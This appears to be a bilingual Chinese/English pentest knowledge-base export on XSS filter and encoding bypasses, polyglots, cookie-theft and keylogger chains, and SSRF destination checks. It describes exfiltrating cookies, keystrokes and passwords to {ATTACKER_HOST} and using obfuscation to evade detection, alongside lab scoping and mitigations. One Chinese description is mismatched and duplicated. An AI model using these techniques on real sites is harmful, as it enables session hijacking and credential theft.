description.en: Encode handler bodies as decimal/hex entities; the WAF sees digits and ampersands while the browser decodes and invokes the handler.

title.zh: 全角字符利用规范化差异

description.zh: 提交全角尖括号载荷，若服务端或前端做 Unicode 规范化还原为半角，过滤发生在规范化之前即被绕过，标签重新生效执行。
description.en: Submit fullwidth angle brackets; if a normalization pass folds them back to ASCII after filtering, the tags reanimate and execute.

title.zh: 混合编码穿透多层过滤
title.en: Combine encodings to pass layered filters

description.zh: 同一载荷混排 JS 转义、HTML 实体与反引号调用，各层过滤视角不同均放行，最终执行环境完成解码触发执行。
description.en: Blend JS escapes, HTML entities and backtick calls in one payload so each filtering layer approves and the runtime still executes it.

analysis.zh: Unicode 与字符编码 XSS 边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Unicode and Character-Encoding XSS Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 分别验证 JavaScript 转义、HTML 字符引用、全角字符、UTF-7 文本和非法 UTF-8 的实际解析上下文。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: XSS 过滤与规范化差异

description.zh: 覆盖 XSS 过滤器的规范化差异绕过：从大小写混淆、双写与注释混淆，到空字节截断与标签属性变形，再到事件处理器变体，并附 Data URI 与 SVG 动画绕过，用于逐项定位过滤规则缺口。
description.en: Covers filter normalization-differential bypasses for XSS: from case obfuscation, doubling, and comment confusion through null-byte truncation and tag-attribute mutations to event-handler variants, with Data URI and SVG animation bypasses, locating filter-rule gaps item by item.

prerequisites.zh: 确认 XSS 过滤与规范化差异 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XSS Filtering and Canonicalization Differences are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 XSS 过滤器的规范化差异绕过：大小写混淆、关键字双写、注释混淆、空字节截断、标签属性空白变形与冷门事件处理器六类变体，用于逐项定位过滤规则缺口。适用于目标存在关键字黑名单或简单过滤器的场景。
overview.en: Covers normalization-differential bypasses of XSS filters across six variant families: case mixing, keyword double-writes, comment obfuscation, null-byte truncation, tag/attribute whitespace mutations, and uncommon event handlers, used to locate filter gaps item by item. Suitable when the target runs keyword blacklists or simple filters.

vulnerability.zh: 根因是过滤器按字面形态匹配关键字，未考虑大小写折叠、一次删除、注释分词、空字节与空白规范化等解析差异；黑名单漏掉的冷门事件处理器也保持可执行，规则缺口即注入通道。
vulnerability.en: The root cause is filters matching keywords by literal shape, ignoring parsing differentials such as case folding, single-pass deletion, comment tokenization, null bytes, and whitespace normalization; uncommon event handlers missing from the blacklist stay executable, and rule gaps become injection channels.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步大小写混淆提交，仍执行即确认过滤对大小写不敏感；第 2 步双写关键字，删除后拼回有效标签执行即确认单次删除可绕过；第 3 步注释插入、第 4 步空字节截断、第 5 步制表/换行变形属性逐一验证；第 6 步用 onpageshow/onstart/ontoggle 等冷门事件确认黑名单覆盖不全。仍被拦截时改用 Data URI 或 SVG 动画绕过。
exploitation.en: Use in Payload list order: step 1 submits case-mixed payloads — execution proves the filter is case-insensitive; step 2 double-writes keywords — execution after deletion reassembles a valid tag, proving single-pass deletion bypass; steps 3-5 verify comment insertion, null-byte truncation, and tab/newline attribute mutations one by one; step 6 uses uncommon handlers like onpageshow/onstart/ontoggle to prove incomplete blacklist coverage. If still blocked, switch to Data URI or SVG-animation bypasses.

mitigation.zh: 放弃关键字黑名单，改按输出上下文编码并用维护中的 sanitizer 白名单化，统一解码后再做检测；修复后重放全部六类变体应无可执行差异，并对新增事件属性保持白名单更新。
mitigation.en: Drop keyword blacklists in favor of context-appropriate output encoding and a maintained sanitizer allowlist, decoding uniformly before inspection; after the fix, replaying all six variant families must show no executable differentials, with allowlists kept current for new event attributes.

title.zh: 大小写混淆绕过黑名单

description.zh: 把标签与属性写成混合大小写，按大小写敏感匹配的黑名单漏检，而 HTML 解析不区分大小写，载荷照常执行。
description.en: Mix case across tags and attributes; case-sensitive blacklists miss them while the case-insensitive HTML parser still executes.

title.zh: 双写绕过单次替换

description.zh: 过滤器只删除一遍关键字时提交双写形态载荷，删除内层后剩余字符恰好拼回完整标签名，载荷恢复执行能力继续利用。
description.en: Submit scrscriptipt-style double writes; after one deletion pass the leftovers reassemble the original tag name.

title.zh: 注释混淆打断特征

description.zh: 在标签与属性之间插入注释与伪注释节点，连续特征串被打断失效，浏览器解析时忽略注释内容，语句恢复完整语义执行。
description.en: Interleave /**/ or fake comments between tokens; long signatures shatter while the parser ignores comments and restores semantics.

title.zh: 空字节截断绕过匹配
title.en: Cut matching short with null bytes

description.zh: 在关键字内部插入空字节，按字节串匹配的过滤器失效，解析器遇空字节截断，前缀恰好还原出可执行标签继续运行。
description.en: Insert null bytes inside keywords; byte-oriented matchers fail while parsers truncate at the null and still honor the tag.

title.zh: Data URI 变体加载执行

description.zh: 链接与 iframe 的 src 用 data URI 承载整页脚本，绕开对外部域名的限制，用户点击或页面内嵌时即加载执行代码。
description.en: Carry scripts in data:text/html URIs on a or iframe src, dodging external-domain restrictions and executing on click or embed.

analysis.zh: XSS 过滤与规范化差异只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Filtering and Canonicalization Differences is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 验证黑名单、大小写处理、标记修复和空白规范化是否在编码之前留下可执行差异。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: XSS 多层解码边界

description.zh: 覆盖多层解码顺序引发的 XSS 边界验证：从 URL、HTML 实体与 JavaScript 编码，到 CSS 编码与多层混合编码，并附双重 URL 编码与 UTF-16 变体，用于确认解码次序不一致时的过滤失效。
description.en: Covers XSS boundary validation driven by multi-layer decode order: from URL, HTML-entity, and JavaScript encoding through CSS and mixed multi-layer encoding, with double URL-encoding and UTF-16 variants, confirming filter failure when decode orders disagree.

prerequisites.zh: 确认 XSS 多层解码边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XSS Multi-Stage Decoding Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖多层解码顺序引发的 XSS 边界验证：URL 编码、HTML 实体、JavaScript 编码、CSS expression 与多层混合编码五类样例，并附双重 URL 编码与 UTF-16 变体。用于确认解码次序不一致时过滤器失效的具体位置。
overview.en: Covers XSS boundary verification driven by multi-layer decoding order: five sample families (URL encoding, HTML entities, JavaScript encoding, CSS expression, and mixed multi-layer encoding) plus double-URL-encoding and UTF-16 variants. Used to pinpoint exactly where filters fail when decode orders diverge.

vulnerability.zh: 根因是请求在框架、应用与浏览器之间经历不同次数与顺序的解码，过滤器只在某一层匹配而执行发生在最后一层；多重解码或错误上下文编码会把被过滤的形态还原为可执行字符。
vulnerability.en: The root cause is requests undergoing different decode counts and orders across framework, application, and browser: the filter matches at only one layer while execution happens at the last; multiple decoding or wrong-context encoding restores filtered shapes into executable characters.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交 URL 编码标签，单层解码后执行即确认解码差异；第 2 步 HTML 实体、第 3 步 JS 十六进制/八进制/atob 编码、第 4 步 CSS expression（旧版 IE）、第 5 步多层混合编码逐层验证；记录每层解码结果定位失效层。被 WAF 拦截时改用双重 URL 编码与 UTF-16 变体。
exploitation.en: Use in Payload list order: step 1 submits URL-encoded tags; execution after one decode confirms the decoding differential. Steps 2-5 verify HTML entities, JS hex/octal/atob encoding, CSS expression (legacy IE), and mixed multi-layer encoding layer by layer; record each decoded layer to locate the failing one. When blocked by a WAF, switch to double-URL-encoding and UTF-16 variants.

mitigation.zh: 应用入口只做一次确定性解码，输出按最终上下文编码一次，拒绝二次解码与歧义编码；修复后重放全部编码层样例不应产生可执行内容，过滤器与应用的解码层次保持一致。
mitigation.en: Decode deterministically exactly once at the application entry, encode output once for the final context, and reject double or ambiguous encodings; after the fix, replaying all encoding-layer samples must yield no executable content, with filter and application decode layers aligned.

title.zh: URL 编码穿透传输层过滤
title.en: Pass transport filters with URL encoding

description.zh: 对载荷做百分号 URL 编码提交，传输层设备看到的特征被稀释，服务端解码后原始标签进入页面渲染执行。
description.en: Percent-encode the payload so transport inspection sees diluted signatures while server-side decoding restores the raw tags.

title.zh: HTML 实体编码绕过输出过滤
title.en: Bypass output filters with HTML entities

description.zh: 把关键字符改写为十进制或十六进制实体提交，输出侧防御被绕开，浏览器渲染时实体解码回标签与代码触发执行。
description.en: Rewrite key characters as decimal or hex entities so output-side defenses pass them and the browser decodes them back to tags.

title.zh: JS 编码与 atob 执行
title.en: Execute via JS encodings and atob

description.zh: 属性值内用转义序列或 atob 解码 base64 字符串再执行，函数名字面量消失，解码后动态运行任意攻击语句。
description.en: Inside attribute values use \u escapes or eval(atob(...)) so literal names vanish and arbitrary statements run after decoding.

title.zh: 混合编码组合穿透
title.en: Combine mixed encodings to break through

description.zh: 把实体编码的函数名放进属性、链接协议部分同样用实体书写，多层解码顺序被利用，各层过滤均无法还原完整特征。
description.en: Mix entity-encoded handlers with entity-written URLs; layered decoding order defeats each filter's view of the payload.

title.zh: 双重编码与 UTF-16 变体
title.en: Use double encoding and UTF-16 variants

description.zh: 首轮编码后再编码一次，或整体转为 UTF-16 字节流，只解码一轮的中间件放行，最终解码环境恢复载荷原形执行。
description.en: Encode twice or emit UTF-16 bytes; middleware decoding only once waves the payload through, and the final decode restores it.

analysis.zh: XSS 多层解码边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Multi-Stage Decoding Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 记录 URL、HTML 和 JavaScript 解码顺序，确认双重解码或错误上下文编码是否恢复可执行字符。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: XSS Polyglot 分上下文速查集
name.en: XSS Polyglot Quick Set by Context

description.zh: 覆盖跨上下文通用的 Polyglot XSS 载荷：从经典与短格式 Polyglot，到属性注入与 URL 参数形态，再到高级组合变体，用于在未知输出上下文中一次投递、多点命中注入面。
description.en: Covers context-agnostic Polyglot XSS payloads: from classic and short-form polyglots through attribute-injection and URL-parameter forms to advanced composite variants, hitting the injection surface across multiple contexts with a single delivery.

prerequisites.zh: 确认 XSS 多上下文输入边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XSS Multi-Context Input Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖跨上下文通用的 Polyglot XSS 载荷：经典全上下文、短格式、属性注入与 URL 参数形态四类，用于在未知输出上下文中一次投递、多点命中注入面。适用于快速确认输入位可达的解析上下文范围。
overview.en: Covers cross-context Polyglot XSS payloads in four forms: classic full-context, short format, attribute injection, and URL-parameter shape, delivering once to hit multiple injection surfaces in unknown output contexts. Suitable for quickly mapping which parsing contexts an input position can reach.

vulnerability.zh: 根因是同一输入位可能同时进入 HTML、属性、脚本与 URL 多种解析上下文，而过滤器只按单一上下文假设处理；Polyglot 载荷借助各上下文共享的语法形态在多处同时形成可执行结构。
vulnerability.en: The root cause is a single input position potentially entering HTML, attribute, script, and URL parsing contexts simultaneously while filters assume a single context; Polyglot payloads leverage syntax shapes shared across contexts to form executable structures in several places at once.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交经典全上下文 Polyglot，任一上下文（HTML/属性/脚本/URL）触发执行即确认该输入位多上下文可达；第 2 步短版本验证闭合既有标签后的执行；第 3 步属性注入形态以悬停/聚焦/点击触发；第 4 步 URL 参数形态以导航或脚本执行确认。命中后按命中的具体上下文转到对应专项条目细化。WAF 变体区提供高级 Polyglot 形态。
exploitation.en: Use in Payload list order: step 1 submits the classic full-context Polyglot; execution in any context (HTML/attribute/script/URL) confirms the input position reaches multiple contexts. Step 2 verifies the short form executing after closing the existing tag; step 3 triggers the attribute-injection form via hover/focus/click; step 4 confirms the URL-parameter form via navigation or script execution. After a hit, move to the dedicated entry for the specific context hit. The WAF section provides advanced Polyglot forms.

mitigation.zh: 按最终输出上下文编码，模板层固定标签结构避免属性逃逸，CSP 限制内联执行；修复后重放各 Polyglot 应在所有上下文中保持不可执行，并以 DOM 快照复核无突变。
mitigation.en: Encode per final output context, pin tag structures at the template layer to avoid attribute escape, and restrict inline execution via CSP; after the fix, replayed Polyglots must stay non-executable in every context, verified with DOM snapshots for mutations.

title.zh: 经典 polyglot 一发多上下文
title.en: Cover many contexts with one classic polyglot

description.zh: 提交经典大杂烩载荷，同时闭合属性、注释、标签与事件多种语法，无论落点在哪个上下文都有分支生效弹出执行。
description.en: Fire the classic kitchen-sink payload closing attributes, comments, tags and events at once; whichever context it lands in, a branch fires.

title.zh: 短 polyglot 快速试探
title.en: Probe fast with a short polyglot

description.zh: 用短闭合链载荷快速试探，先关闭 script、style、textarea 等常见包裹再注入新标签，命中包裹形态即直接执行。
description.en: Use the short closure chain to snap shut script, style and textarea wrappers before injecting a fresh tag that executes on hit.

title.zh: 属性上下文 polyglot 注入

description.zh: 用短闭合链载荷快速试探各落点，先关闭 script、style、textarea 等常见包裹再注入新标签，命中包裹形态即直接执行。
description.en: When the sink is an attribute value, submit onmouseover/autofocus combos that keep quotes balanced and append a new attribute.

title.zh: URL 参数上下文利用

description.zh: 参数落进链接地址时用伪协议加注释后缀伪装正常链接，data URI 承载整页脚本，受害者点击链接即执行代码。
description.en: For href-bound parameters, prefix javascript: with a comment-disguised URL or carry a full page via data URI that runs on click.

title.zh: 高级闭合组合变体

description.zh: 被部分过滤时改用高级 polyglot，先闭合注释与标签再注入 svg 事件，多重语法兜底显著提高单次命中执行概率。
description.en: Under partial filtering use the advanced polyglot closing comments and tags before an svg event, maximizing single-shot odds.

analysis.zh: XSS 多上下文输入边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Multi-Context Input Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 用单一无害标记识别输入落入的真实 HTML、属性、URL 或脚本上下文，不宣称存在通用载荷。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: XSS 会话 Cookie 暴露验证

description.zh: 覆盖 XSS 场景下会话 Cookie 窃取链的验证：从 Image、Fetch 与 XMLHttpRequest 三种外传方式，到编码传输与完整利用脚本，用于确认注入点能否升级为会话劫持。
description.en: Covers validation of session-cookie theft chains in XSS scenarios: from Image, Fetch, and XMLHttpRequest exfiltration paths through encoded transport and full exploit scripts, confirming whether an injection point escalates to session hijacking.

prerequisites.zh: 确认 XSS 会话 Cookie 暴露验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XSS Session-Cookie Exposure Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 XSS 会话 Cookie 窃取链的完整验证：Image、fetch/sendBeacon、XMLHttpRequest 三种外传通道，Base64 编码传输与收集 Cookie/页面地址/UA 的完整利用脚本。用于确认注入点能否升级为会话劫持并量化可窃取面。
overview.en: Covers end-to-end verification of the XSS session-cookie theft chain: Image, fetch/sendBeacon, and XMLHttpRequest exfiltration channels, Base64-encoded transport, and a full exploit script collecting cookie, page URL, and UA. Used to confirm whether an injection point escalates to session hijacking and to quantify the stealable surface.

vulnerability.zh: 根因是 Cookie 缺少 HttpOnly 标志且存在可执行 XSS，脚本可读取 document.cookie 并经任意请求外传；Secure 与 SameSite 不影响脚本读取，非 HttpOnly 的会话值即可被完整取走。
vulnerability.en: The root cause is cookies missing the HttpOnly flag combined with executable XSS: scripts read document.cookie and exfiltrate it over arbitrary requests; Secure and SameSite do not affect script reads, so any non-HttpOnly session value is fully stealable.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以 Image 请求把 cookie 发往 {ATTACKER_HOST}，收集端收到 c 参数即确认基础窃取链；第 2 步 fetch/sendBeacon 与第 3 步 XHR 验证多通道可用；第 4 步 Base64 编码后外发，收集端解码还原即确认编码传输；第 5 步外发 cookie、页面地址与 UA 完整参数集。被 WAF 拦截时改用混淆绕过变体。
exploitation.en: Use in Payload list order: step 1 sends the cookie to {ATTACKER_HOST} via an Image request; the collector receiving the c parameter confirms the basic theft chain. Step 2 (fetch/sendBeacon) and step 3 (XHR) verify multi-channel availability; step 4 sends Base64-encoded values with the collector decoding them, confirming encoded transport; step 5 exfiltrates the full cookie, page URL, and UA parameter set. When blocked by a WAF, switch to the obfuscation variant.

mitigation.zh: 全部会话 Cookie 设置 HttpOnly 并配合 Secure 与 SameSite，同步修复 XSS 注入点（按上下文编码与 CSP）；修复后重放各通道脚本收集端应无任何请求，document.cookie 返回值不含会话凭据。
mitigation.en: Set HttpOnly on all session cookies together with Secure and SameSite, and fix XSS injection points in parallel (context encoding plus CSP); after the fix, replaying each channel script must produce no collector requests, and document.cookie must not contain session credentials.

title.zh: Image 对象外带 Cookie
title.en: Exfiltrate cookies with an Image object

description.zh: 注入以新建图片请求拼接 document.cookie 的脚本，图片加载请求把 Cookie 带往控制端，日志命中即完成窃取。
description.en: Inject a new Image().src beacon that appends document.cookie; the image request carries the cookie to the collector's log.

title.zh: fetch 与 sendBeacon 通道

description.zh: 改用 fetch 或浏览器信标接口发送 Cookie，后者在页面关闭后仍保证送达，显著提高外带动作的可靠性。
description.en: Switch to fetch or navigator.sendBeacon; the beacon API delivers even after page close for reliable exfiltration.

title.zh: base64 编码规避审查
title.en: Encode with base64 to dodge inspection

description.zh: 先对 Cookie 做 base64 编码再外带，请求内容不再呈现明文口令特征，控制端收到后解码还原原始会话凭据使用。
description.en: btoa-encode the cookie before sending so plaintext signatures vanish; decode server-side to restore the session secrets.

title.zh: 完整脚本携带环境信息
title.en: Ship full context with the payload

description.zh: 用完整利用脚本同时外带 Cookie、页面地址、UA 与时间戳，凭据与来源绑定，便于精准复用会话仿冒受害者操作。
description.en: Run the full script exfiltrating cookie, location, UA and timestamp together so credentials pair with origin for precise session reuse.

title.zh: 混淆版本绕过过滤
title.en: Use the obfuscated build when filtered

description.zh: 脚本被关键字过滤拦截时改用十六进制混淆版本，变量名与字符串编码后匹配失效，外带逻辑保持不变继续收数据。
description.en: When keyword filters block the script, switch to the hex-obfuscated build whose encoded names evade matching with logic intact.

analysis.zh: XSS 会话 Cookie 暴露验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Session-Cookie Exposure Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 验证测试 Cookie 的 HttpOnly、SameSite 与作用域，并以本地标记证明脚本执行，不向外部端点发送 Cookie。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: XSS 输入事件访问边界

description.zh: 覆盖 XSS 的输入事件收集链验证：从基础与完整键盘记录脚本，到表单数据窃取与表单提交劫持，用于确认注入点能否持续捕获用户击键与凭据输入。
description.en: Covers validation of input-event collection chains via XSS: from basic and full keylogger scripts through form-data theft and submit hijacking, confirming whether an injection point can persistently capture user keystrokes and credential input.

prerequisites.zh: 确认 XSS 输入事件访问边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XSS Input-Event Access Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 覆盖 XSS 输入事件收集链的验证：基础 keypress 监听、缓冲整行外发、密码字段 change 窃取与表单提交劫持四种形态。用于确认注入脚本能否持续捕获用户击键与凭据输入。
overview.en: Covers verification of the XSS input-event collection chain across four forms: basic keypress listeners, buffered full-line exfiltration, password-field change theft, and form-submit hijacking. Used to confirm whether injected scripts can continuously capture keystrokes and credential input.

vulnerability.zh: 根因是注入脚本可注册页面级事件监听并访问表单字段值，keydown/change/submit 事件对脚本完全开放；脚本存活期间击键与表单数据持续外传，影响覆盖注入页面上的全部用户输入。
vulnerability.en: The root cause is injected scripts registering page-level event listeners and reading form field values: keydown/change/submit events are fully open to script. While the script lives, keystrokes and form data keep flowing out, covering every user input on the injected page.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步注入 keypress 监听外发击键，收集端按 key 参数收到按键流即确认基础记录链；第 2 步缓冲击键并在 Enter 时整段外发验证完整记录；第 3 步监听密码字段 change 外发字段值；第 4 步劫持 form submit 外发完整表单数据。收集端指向 {ATTACKER_HOST} 自有服务器；被 WAF 拦截时改用混淆版本。
exploitation.en: Use in Payload list order: step 1 injects a keypress listener exfiltrating keystrokes; the collector receiving the keystroke stream via the key parameter confirms the basic chain. Step 2 buffers keystrokes and sends the full line on Enter; step 3 listens on password-field change events to exfiltrate field values; step 4 hijacks form submit to exfiltrate the complete form data. Point the collector at your own {ATTACKER_HOST} server; when blocked by a WAF, switch to the obfuscated version.

mitigation.zh: 修复 XSS 注入点并以 CSP 限制内联脚本，凭据表单避免进入可注入渲染路径；修复后重放监听脚本应无法注册事件或无法外传，并在监控中对异常事件监听注册告警。
mitigation.en: Fix XSS injection points and restrict inline scripts via CSP, keeping credential forms out of injectable render paths; after the fix, replayed listeners must fail to register or exfiltrate, with monitoring alerting on abnormal event-listener registration.

title.zh: keypress 逐键外带

description.zh: 注入按键监听把受害者每次输入立即发往控制端，日志按时间顺序拼接即可还原完整输入内容，先证明捕获通道可用。
description.en: Hook keypress and ship each key instantly; ordered log lines rebuild the typed content and prove the capture channel.

title.zh: 缓冲批量外带输入
title.en: Buffer and flush input in batches

description.zh: 改为累积缓冲模式，遇回车键才整段外带，请求量骤减更加隐蔽，控制端一次即可拿到受害者的完整输入串内容。
description.en: Buffer keys and flush on Enter to cut request volume and stay quiet while delivering whole input strings at once.

title.zh: 窃取密码框内容

description.zh: 选中密码类输入框并监听值变化事件，受害者填写的口令被直接外带回收，捕获目标从普通输入内容升级到登录凭据材料。
description.en: Target input[type=password] change events to exfiltrate filled credentials, focusing capture from typing to secrets.

title.zh: 劫持整表提交

description.zh: 监听表单提交事件以 FormData 打包全部字段一次性外带，登录、改密等整表内容连同操作动作全部落网收割。
description.en: Hook form submit and serialize all fields via FormData so complete login or password-change payloads are captured in one shot.

title.zh: 混淆版本规避检测
title.en: Use the obfuscated build to evade detection

description.zh: 检测规则命中监听函数等特征时改用十六进制混淆脚本，函数名与字符串全部编码，监听逻辑保持不变继续收键。
description.en: When signatures like addEventListener trip rules, run the hex-obfuscated script with encoded names but identical listener logic.

analysis.zh: XSS 输入事件访问边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Input-Event Access Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 仅用合成键盘事件确认注入脚本能否注册页面事件，不收集、缓存或传输真实用户输入。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: SSRF 最终连接目标验证

description.zh: 覆盖 SSRF 的最终连接目标验证：从回环地址与本机端口探测，到内网段主机与管理台触达，再到 file:// 本地文件读取，用于确认服务端请求的真实落点与内网暴露面。
description.en: Covers final-destination validation for SSRF: from loopback address and local port probing through intranet host and admin-console reachability to file:// local file reads, to confirm where server-side requests truly land and what the intranet exposure is.

prerequisites.zh: 确认 SSRF 最终连接目标验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for SSRF Final-Destination Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: SSRF 最终连接目标验证覆盖服务端取回器的最终落点探测场景：针对可注入 URL 的取回功能，确认请求真实连接的 IP、端口与协议。验证维度涵盖回环地址、本机常用端口、内网段与管理台触达，以及 file:// 本地文件读取四类技术变体。
overview.en: SSRF Final-Destination Validation covers the server-side fetcher landing-point scenario: given a URL-injectable fetch function, determine the IP, port, and protocol the request actually connects to. Verification dimensions cover loopback addresses, common local ports, internal subnets and admin consoles, plus file:// local file read as four technical variants.

vulnerability.zh: 根因是服务端取回功能允许用户输入控制最终连接目标，而校验只检查原始 URL 字符串，未在规范化解析、DNS 解析和重定向后对最终 IP、端口与 scheme 重新分类，回环、私网与本地文件因此越过出站信任边界。
vulnerability.en: The root cause is that the server-side fetch function lets user input control the final connection target, while validation only inspects the raw URL string and never re-classifies the final IP, port, and scheme after canonical parsing, DNS resolution, and redirects; loopback, private networks, and local files therefore cross the egress trust boundary.

